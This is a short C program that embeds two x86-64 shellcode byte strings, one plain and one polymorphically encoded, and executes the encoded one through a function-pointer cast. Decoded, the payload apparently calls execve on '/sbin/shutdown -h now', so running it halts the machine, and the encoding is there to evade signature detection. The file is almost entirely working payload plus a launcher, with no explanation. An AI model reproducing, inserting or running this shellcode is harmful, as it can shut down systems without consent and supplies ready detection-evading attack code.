#include<stdio.h>
#include<string.h>


unsigned char shellcode[] =
//non poly
"\x48\x31\xc0\x99\x50\x66\x68\x2d\x68\x54\x59\x50\x6a\x77\x66\x68\x6e\x6f\x54\x5b\x50\x53\x51\x54\x5e\x50\xeb\x0f\x5f\x6a\x0f\x59\x80\x04\x0f\x01\xe2\xfa\x6a\x3b\x58\x0f\x05\xe8\xec\xff\xff\xff\x2f\x2e\x2e\x72\x61\x68\x6d\x2e\x72\x67\x74\x73\x63\x6e\x76\x6d"
;

unsigned char shellcode_poly[] =
//poly
"\x48\x31\xc0\x99\x50\x66\xb8\x2d\x68\x66\x50\x48\x31\xc0\x54\x59\x50\x6a\x77\x66\x68\x6e\x6f\x54\x5b\x50\x53\x51\x54\x5e\x50\xeb\x15\x5f\x48\x31\xc9\x48\x83\xc1\x0f\x80\x04\x0f\x02\xe2\xfa\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xe6\xff\xff\xff\x2f\x2d\x2d\x71\x60\x67\x6c\x2d\x71\x66\x73\x72\x62\x6d\x75\x6c"
;


main()
{
	printf("Shellcode Length: %d\n", (int)strlen(shellcode));
	printf("Shellcode Poly Length: %d\n", (int)strlen(shellcode_poly));


	//int (*ret)() = (int(*)())shellcode;
	int (*ret)() = (int(*)())shellcode_poly;
	ret();
}
